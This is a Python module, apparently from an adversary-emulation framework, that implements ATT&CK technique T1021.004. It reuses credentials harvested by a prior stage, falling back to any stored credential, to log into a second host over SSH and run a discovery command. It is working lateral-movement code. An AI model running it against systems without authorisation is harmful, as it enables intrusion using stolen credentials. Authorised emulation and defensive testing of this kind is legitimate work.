"""
techniques/lateral_movement/ssh_pivot.py
ATT&CK: T1021.004 — Remote Services: SSH
Tactic:  Lateral Movement

Uses credentials harvested by a prior credential-access stage to
open an SSH session to a pivot target and execute a basic discovery
command. The goal is to prove authenticated access to a second host —
which, in a real engagement, is the point at which lateral movement
is confirmed. Records the pivot host in Context.
"""

import paramiko
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique


class SSHPivot(Technique):
    name = "ssh-pivot"
    attack_id = "T1021.004"
    tactic = Tactic.LATERAL_MOVEMENT

    def __init__(
        self,
        target: str,
        port: int = 22,
        username: str | None = None,
        password: str | None = None,
        probe_command: str = "id && hostname",
        timeout: float = 10.0,
    ):
        self.target = target
        self.port = port
        self.username = username    # if None, pulled from Context creds
        self.password = password
        self.probe_command = probe_command
        self.timeout = timeout

    def _resolve_credential(self, context: Context) -> tuple[str, str] | tuple[None, None]:
        """Use explicit params if set, otherwise pull from Context creds."""
        if self.username and self.password:
            return self.username, self.password
        creds = context.credentials_valid_on(self.target)
        if not creds:
            # Fall back to any credential in context
            if context.credentials:
                c = context.credentials[0]
                return c.username, c.password
        else:
            c = creds[0]
            return c.username, c.password
        return None, None

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        username, password = self._resolve_credential(context)

        if not username or not password:
            return False, "No credentials available in Context for SSH pivot", {}

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False,
            )
            _, stdout, stderr = client.exec_command(self.probe_command)
            output = stdout.read().decode("utf-8", errors="replace").strip()
            err = stderr.read().decode("utf-8", errors="replace").strip()
            client.close()

            context.add_host(self.target, notes=f"SSH pivot confirmed as {username}")

            summary = (
                f"SSH pivot to {self.target}:{self.port} as {username} — "
                f"probe output: {output[:120]}"
            )
            return True, summary, {
                "target": self.target,
                "port": self.port,
                "username": username,
                "probe_command": self.probe_command,
                "probe_output": output,
                "probe_stderr": err,
            }

        except paramiko.AuthenticationException:
            return False, f"Authentication failed for {username}@{self.target}:{self.port}", {}
        except Exception as exc:
            return False, f"SSH pivot failed: {exc}", {}
        finally:
            client.close()
